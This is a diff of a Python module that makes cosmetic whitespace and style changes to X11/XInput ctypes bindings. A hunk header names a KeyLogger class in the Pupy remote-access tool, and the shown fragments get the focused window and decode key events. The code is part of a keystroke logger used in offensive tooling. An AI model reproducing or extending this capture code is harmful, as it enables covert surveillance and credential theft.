@@ -16,158 +16,158 @@ try:
         ct.c_char_p,
         ct.c_void_p, ct.c_void_p, ct.c_void_p, ct.c_void_p, ct.c_void_p
     ]
-    x11.XCloseDisplay.argtypes = [ ct.c_void_p ]
+    x11.XCloseDisplay.argtypes = [ct.c_void_p]
     x11.XQueryKeymap.restype = ct.c_int
-    x11.XQueryKeymap.argtypes = [ ct.c_void_p, ct.c_void_p ]
+    x11.XQueryKeymap.argtypes = [ct.c_void_p, ct.c_void_p]
     x11.XGetInputFocus.restype = ct.c_int
-    x11.XGetInputFocus.argtypes = [ ct.c_void_p, ct.c_void_p, ct.c_void_p ]
+    x11.XGetInputFocus.argtypes = [ct.c_void_p, ct.c_void_p, ct.c_void_p]
     x11.XGetClassHint.restype = ct.c_int
-    x11.XGetClassHint.argtypes = [ ct.c_void_p, ct.c_ulong, ct.c_void_p ]
+    x11.XGetClassHint.argtypes = [ct.c_void_p, ct.c_ulong, ct.c_void_p]
     x11.XkbGetKeyboard.restype = ct.c_void_p
-    x11.XkbGetKeyboard.argtypes = [ ct.c_void_p, ct.c_uint, ct.c_uint ]
-    x11.XkbGetState.argtypes = [ ct.c_void_p, ct.c_uint, ct.c_void_p ]
+    x11.XkbGetKeyboard.argtypes = [ct.c_void_p, ct.c_uint, ct.c_uint]
+    x11.XkbGetState.argtypes = [ct.c_void_p, ct.c_uint, ct.c_void_p]
     x11.XKeycodeToKeysym.restype = ct.c_uint
-    x11.XKeycodeToKeysym.argtypes = [ ct.c_void_p, ct.c_uint ]
+    x11.XKeycodeToKeysym.argtypes = [ct.c_void_p, ct.c_uint]
     x11.XkbKeycodeToKeysym.restype = ct.c_uint
-    x11.XkbKeycodeToKeysym.argtypes = [ ct.c_void_p, ct.c_uint ]
+    x11.XkbKeycodeToKeysym.argtypes = [ct.c_void_p, ct.c_uint]
     x11.XDefaultRootWindow.restype = ct.c_ulong
-    x11.XDefaultRootWindow.argtypes = [ ct.c_void_p ]
-    x11.XNextEvent.argtypes = [ ct.c_void_p, ct.c_void_p ]
-    x11.XMapWindow.argtypes = [ ct.c_void_p, ct.c_ulong ]
-    x11.XSync.argtypes = [ ct.c_void_p, ct.c_int ]
-    x11.XMaskEvent.argtypes = [ ct.c_void_p, ct.c_ulong, ct.c_void_p ]
-    x11.XSelectInput.argtypes = [ ct.c_void_p, ct.c_uint, ct.c_long ]
-    x11.XDestroyWindow.argtypes = [ ct.c_void_p, ct.c_ulong ]
-    x11.XGetEventData.argtypes = [ ct.c_void_p, ct.c_void_p ]
-    x11.XFreeEventData.argtypes = [ ct.c_void_p, ct.c_void_p ]
-    x11.XQueryExtension.argtypes = [ ct.c_void_p, ct.c_char_p, ct.c_void_p, ct.c_void_p, ct.c_void_p ]
+    x11.XDefaultRootWindow.argtypes = [ct.c_void_p]
+    x11.XNextEvent.argtypes = [ct.c_void_p, ct.c_void_p]
+    x11.XMapWindow.argtypes = [ct.c_void_p, ct.c_ulong]
+    x11.XSync.argtypes = [ct.c_void_p, ct.c_int]
+    x11.XMaskEvent.argtypes = [ct.c_void_p, ct.c_ulong, ct.c_void_p]
+    x11.XSelectInput.argtypes = [ct.c_void_p, ct.c_uint, ct.c_long]
+    x11.XDestroyWindow.argtypes = [ct.c_void_p, ct.c_ulong]
+    x11.XGetEventData.argtypes = [ct.c_void_p, ct.c_void_p]
+    x11.XFreeEventData.argtypes = [ct.c_void_p, ct.c_void_p]
+    x11.XQueryExtension.argtypes = [ct.c_void_p, ct.c_char_p, ct.c_void_p, ct.c_void_p, ct.c_void_p]
     x11.XSetErrorHandler.restype = ct.c_int
-    x11.XSetErrorHandler.argtypes = [ ct.c_void_p ]
+    x11.XSetErrorHandler.argtypes = [ct.c_void_p]
     x11.XSetIOErrorHandler.restype = ct.c_int
-    x11.XSetIOErrorHandler.argtypes = [ ct.c_void_p ]
+    x11.XSetIOErrorHandler.argtypes = [ct.c_void_p]
 except:
     x11 = None
 
 try:
     xi = ct.cdll.LoadLibrary(find_library('Xi'))
     xi.XOpenDevice.restype = ct.c_void_p
-    xi.XOpenDevice.argtypes = [ ct.c_void_p, ct.c_uint ]
-    xi.XCloseDevice.argtypes = [ ct.c_void_p, ct.c_void_p ]
-    xi.XISelectEvents.argtypes = [ ct.c_void_p, ct.c_uint, ct.c_void_p, ct.c_int ]
+    xi.XOpenDevice.argtypes = [ct.c_void_p, ct.c_uint]
+    xi.XCloseDevice.argtypes = [ct.c_void_p, ct.c_void_p]
+    xi.XISelectEvents.argtypes = [ct.c_void_p, ct.c_uint, ct.c_void_p, ct.c_int]
 except:
     xi = None
 
 class ClassHint(ct.Structure):
     _fields_ = [
-        ( "name", ct.c_char_p ),
-        ( "klass", ct.c_char_p )
+        ("name", ct.c_char_p),
+        ("klass", ct.c_char_p)
     ]
 
 class XkbState(ct.Structure):
     _fields_ = [
-        ( "group", ct.c_char ),
-        ( "locked_group", ct.c_char ),
-        ( "base_group", ct.c_char ),
-        ( "latched_group", ct.c_char ),
-        ( "mods", ct.c_char ),
-        ( "base_mods", ct.c_char ),
-        ( "latched_mods", ct.c_char ),
-        ( "locked_mods", ct.c_char ),
-        ( "compat_state", ct.c_char ),
-        ( "grab_mods", ct.c_char ),
-        ( "compat_grab_mods", ct.c_char ),
-        ( "lookup_mods", ct.c_char ),
-        ( "compat_lookup_mods", ct.c_char ),
-        ( "ptr_buttons", ct.c_char )
+        ("group", ct.c_char),
+        ("locked_group", ct.c_char),
+        ("base_group", ct.c_char),
+        ("latched_group", ct.c_char),
+        ("mods", ct.c_char),
+        ("base_mods", ct.c_char),
+        ("latched_mods", ct.c_char),
+        ("locked_mods", ct.c_char),
+        ("compat_state", ct.c_char),
+        ("grab_mods", ct.c_char),
+        ("compat_grab_mods", ct.c_char),
+        ("lookup_mods", ct.c_char),
+        ("compat_lookup_mods", ct.c_char),
+        ("ptr_buttons", ct.c_char)
     ]
 
 class XiEventMask(ct.Structure):
     _fields_ = [
-        ( "deviceid", ct.c_int ),
-        ( "mask_len", ct.c_int ),
-        ( "mask", ct.c_void_p )
+        ("deviceid", ct.c_int),
+        ("mask_len", ct.c_int),
+        ("mask", ct.c_void_p)
     ]
 
 class XGenericEventCookie(ct.Structure):
     _fields_ = [
-        ( "type",        ct.c_int ),
-        ( "serial",      ct.c_ulong ),
-        ( "send_event",  ct.c_int ),
-        ( "display",     ct.c_void_p ),
-        ( "extension",   ct.c_int ),
-        ( "evtype",      ct.c_int ),
-        ( "cookie",      ct.c_uint ),
-        ( "data",        ct.c_void_p )
+        ("type",        ct.c_int),
+        ("serial",      ct.c_ulong),
+        ("send_event",  ct.c_int),
+        ("display",     ct.c_void_p),
+        ("extension",   ct.c_int),
+        ("evtype",      ct.c_int),
+        ("cookie",      ct.c_uint),
+        ("data",        ct.c_void_p)
     ]
 
 class XEventType(ct.Structure):
     _fields_ = [
-        ( "type", ct.c_int ),
-        ( "pad", ct.c_long * 24 )
+        ("type", ct.c_int),
+        ("pad", ct.c_long * 24)
     ]
 
 class XEvent(ct.Union):
     _fields_ = [
-        ( "type",   XEventType ),
-        ( "cookie", XGenericEventCookie ),
+        ("type",   XEventType),
+        ("cookie", XGenericEventCookie),
     ]
 
 class XIValuatorState(ct.Structure):
     _fields_ = [
-        ( "mask_len",   ct.c_int ),
-        ( "mask",       ct.c_void_p ),
-        ( "values",     ct.c_void_p ),
+        ("mask_len",   ct.c_int),
+        ("mask",       ct.c_void_p),
+        ("values",     ct.c_void_p),
     ]
 
 class XIButtonState(ct.Structure):
     _fields_ = [
-        ( "mask_len",   ct.c_int ),
-        ( "mask",       ct.c_void_p )
+        ("mask_len",   ct.c_int),
+        ("mask",       ct.c_void_p)
     ]
 
 class XIModifierState(ct.Structure):
     _fields_ = [
-        ( "base",       ct.c_int ),
-        ( "latched",    ct.c_int ),
-        ( "locked",     ct.c_int ),
-        ( "effective",  ct.c_int ),
+        ("base",       ct.c_int),
+        ("latched",    ct.c_int),
+        ("locked",     ct.c_int),
+        ("effective",  ct.c_int),
     ]
 
 class XIDeviceEvent(ct.Structure):
     _fields_ = [
-        ( "type",       ct.c_int  ),
-        ( "serial",     ct.c_ulong ),
-        ( "send_event", ct.c_int ),
-        ( "display",    ct.c_void_p ),
-        ( "extension",  ct.c_int ),
-        ( "evtype",     ct.c_int ),
-        ( "time",       ct.c_ulong ),
-        ( "deviceid",   ct.c_int ),
-        ( "sourceid",   ct.c_int ),
-        ( "detail",     ct.c_int ),
-        ( "root",       ct.c_ulong),
-        ( "event",      ct.c_ulong ),
-        ( "child",      ct.c_ulong ),
-        ( "root_x",     ct.c_double ),
-        ( "root_y",     ct.c_double ),
-        ( "event_x",    ct.c_double ),
-        ( "event_y",    ct.c_double ),
-        ( "flags",      ct.c_int ),
-        ( "buttons" ,   XIButtonState ),
-        ( "valuators",  XIValuatorState ),
-        ( "mods",       XIModifierState ),
-        ( "group",      XIModifierState ),
+        ("type",       ct.c_int),
+        ("serial",     ct.c_ulong),
+        ("send_event", ct.c_int),
+        ("display",    ct.c_void_p),
+        ("extension",  ct.c_int),
+        ("evtype",     ct.c_int),
+        ("time",       ct.c_ulong),
+        ("deviceid",   ct.c_int),
+        ("sourceid",   ct.c_int),
+        ("detail",     ct.c_int),
+        ("root",       ct.c_ulong),
+        ("event",      ct.c_ulong),
+        ("child",      ct.c_ulong),
+        ("root_x",     ct.c_double),
+        ("root_y",     ct.c_double),
+        ("event_x",    ct.c_double),
+        ("event_y",    ct.c_double),
+        ("flags",      ct.c_int),
+        ("buttons",    XIButtonState),
+        ("valuators",  XIValuatorState),
+        ("mods",       XIModifierState),
+        ("group",      XIModifierState),
     ]
 
 class XErrorEvent(ct.Structure):
     _fields_ = [
-        ( "type",       ct.c_int ),
-        ( "display",    ct.c_void_p ),
-        ( "serial",     ct.c_uint ),
-        ( "error_code", ct.c_char ),
-        ( "request_code", ct.c_char ),
-        ( "minor_code", ct.c_char ),
-        ( "XID",        ct.c_ulong )
+        ("type",       ct.c_int),
+        ("display",    ct.c_void_p),
+        ("serial",     ct.c_uint),
+        ("error_code", ct.c_char),
+        ("request_code", ct.c_char),
+        ("minor_code", ct.c_char),
+        ("XID",        ct.c_ulong)
     ]
 
 def XiMaxLen():
@@ -621,9 +621,9 @@ class KeyLogger(pupy.Task):
         window = ct.c_ulong()
         dw = ct.c_int()
 
-        if not ( self.x11.XGetInputFocus(
+        if not (self.x11.XGetInputFocus(
             self.display, ct.pointer(window), ct.pointer(dw)
-        ) and window ):
+        ) and window):
             return
 
         return window
@@ -698,8 +698,7 @@ class KeyLogger(pupy.Task):
                 callback(self.to_keysyms(
                     [xievent.detail],
                     xievent.group.effective,
-                    xievent.mods.effective
-                ))
+                    xievent.mods.effective))
 
             self.x11.XFreeEventData(self.display, ct.pointer(event.cookie))
 
@@ -734,7 +733,7 @@ class KeyLogger(pupy.Task):
                 if value & (1 << bit):
                     current.add(byte*8 + bit)
 
-        released = set(x for x in self.state if not x in current and x)
+        released = set(x for x in self.state if x not in current and x)
 
         self.state = current
         group, self.group = self.group, group
